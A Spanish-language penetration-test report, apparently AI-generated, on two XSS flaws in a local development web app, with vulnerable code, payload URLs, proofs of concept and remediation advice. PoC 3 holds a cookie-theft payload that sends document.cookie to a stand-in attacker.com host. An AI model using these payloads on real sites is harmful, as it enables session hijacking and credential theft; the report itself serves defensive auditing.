# Informe de Auditoría de Seguridad – Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS  
**Analista:** Copilot Security Audit  

---

## 1. Resumen Ejecutivo

Se identificaron **dos vulnerabilidades XSS** en la aplicación web objetivo:

| # | Tipo | Parámetro | Severidad |
|---|------|-----------|-----------|
| 1 | DOM-based XSS (Reflected) | `search` | Alta |
| 2 | Stored XSS (via localStorage) | `name`, `comment` | Alta |

Ambas vulnerabilidades permiten la ejecución arbitraria de código JavaScript en el navegador de la víctima, lo que puede derivar en robo de sesiones, redirecciones maliciosas o ataques de phishing.

---

## 2. Metodología

1. Exploración inicial con `curl` para obtener el código fuente de la página.
2. Análisis del HTML y JavaScript del lado del cliente en busca de sinks inseguros (`document.write`, `innerHTML`, etc.).
3. Identificación de flujos de datos desde fuentes controladas por el usuario (parámetros GET, localStorage) hasta sinks de escritura DOM.
4. Construcción y verificación de payloads XSS.

---

## 3. Descripción de Vulnerabilidades

### 3.1 DOM-based XSS – Parámetro `search`

**Descripción:**  
El parámetro GET `search` es leído mediante `URLSearchParams` y su valor se inserta directamente en el DOM a través de `document.write` sin ningún tipo de sanitización o codificación de entidades HTML.

**Código vulnerable:**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

**Payload de explotación:**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS-DOM')>
http://web.dev.local:8082/?search=<script>alert('XSS')</script>
```

**Impacto:** Cualquier usuario que acceda a una URL manipulada ejecutará el código JavaScript inyectado. Un atacante puede distribuir este enlace para robar cookies, credenciales o realizar acciones en nombre del usuario.

---

### 3.2 Stored XSS – Sistema de Comentarios (localStorage)

**Descripción:**  
El sistema de comentarios almacena los valores de los parámetros `name` y `comment` en `localStorage` sin sanitización. Al cargar la página, estos valores se leen y se escriben en el DOM mediante `document.write`, también sin ningún filtro.

**Código vulnerable:**
```javascript
// Al guardar:
comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
localStorage.setItem('comments', JSON.stringify(comments));

// Al mostrar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

**Payload de explotación:**
```
http://web.dev.local:8082/?name=Atacante&comment=<img src=x onerror=alert('Stored-XSS')>
```

**Impacto:** El payload queda almacenado en el `localStorage` del navegador afectado y se ejecuta cada vez que el usuario visita la página, incluso sin manipulación adicional de URL.

---

## 4. Pruebas de Concepto (PoC)

### PoC 1 – DOM-based XSS en búsqueda
```
URL: http://web.dev.local:8082/?search=<script>alert(document.cookie)</script>
Resultado esperado: Ejecución del alert con las cookies del usuario
```

### PoC 2 – Stored XSS en comentarios
```
URL: http://web.dev.local:8082/?name=test&comment=<svg onload=alert('XSS')>
Resultado esperado: El payload queda almacenado y se ejecuta en cada visita posterior
```

### PoC 3 – Robo de cookies simulado
```
URL: http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
Resultado esperado: Redirección con cookies de sesión al servidor del atacante
```

---

## 5. Análisis de Causa Raíz

| Causa | Detalle |
|-------|---------|
| Ausencia de sanitización | Los datos de usuario se insertan directamente en el DOM |
| Uso de `document.write` | Función insegura que permite insertar HTML arbitrario |
| Sin CSP (Content Security Policy) | No hay cabeceras HTTP que limiten la ejecución de scripts inline |
| Sin validación de entrada | No se valida ni codifica el input antes de usarlo |

---

## 6. Recomendaciones

1. **Sanitizar toda entrada de usuario** antes de insertarla en el DOM. Usar funciones como `textContent` en lugar de `innerHTML` o `document.write`.

2. **Codificar entidades HTML** al reflejar datos en la página: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`.

3. **Implementar Content Security Policy (CSP)** con cabecera HTTP:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Reemplazar `document.write`** por métodos DOM seguros:
   ```javascript
   // Inseguro:
   document.write('<p>' + userInput + '</p>');
   
   // Seguro:
   const p = document.createElement('p');
   p.textContent = userInput;  // textContent no interpreta HTML
   container.appendChild(p);
   ```

5. **No almacenar HTML sin sanitizar en localStorage.** Si se deben almacenar datos del usuario, sanitizarlos antes del almacenamiento y al mostrarlos.

6. **Usar una librería de sanitización** como [DOMPurify](https://github.com/cure53/DOMPurify) si es necesario renderizar HTML.

---

## 7. Clasificación CVSS

| Vulnerabilidad | Vector | Score (estimado) |
|----------------|--------|-----------------|
| DOM-based XSS (search) | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | **6.1 (Medium-High)** |
| Stored XSS (comments) | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | **6.1 (Medium-High)** |

---

## 8. Conclusión

La aplicación web en http://web.dev.local:8082 presenta vulnerabilidades XSS tanto reflejadas (DOM-based) como almacenadas. La causa principal es el uso de `document.write` con datos no sanitizados provenientes de parámetros URL y `localStorage`. Se recomienda priorizar la corrección de estas vulnerabilidades aplicando las medidas indicadas en la sección de recomendaciones.

---

*Informe generado el 2026-04-30 a las 16:08 UTC*
